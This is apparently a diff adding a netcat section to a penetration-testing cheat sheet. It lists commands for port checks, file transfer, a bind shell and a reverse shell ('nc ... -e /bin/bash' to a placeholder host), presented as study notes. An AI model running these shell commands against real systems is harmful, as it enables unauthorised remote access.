@@ -130,3 +130,11 @@ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/pene
 alias alias_name="command"
 ```
 `unalias` unsets an alias.
+
+### `netcat`
+Check if port is open (no dns lookup, verbose): `nc -nv {{ip}} {{port}}`
+Listen: `nc -lvpn {{port}}`
+Receive file: `nc -nlvp 4444 > incoming.exe`
+Send file: `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
+Bind shell (server binds shell): `nc -nlvp 4444 -e cmd.exe`
+Reverse shell (client binds shell): `nc -nv {{ip}} {{port}} -e /bin/bash`
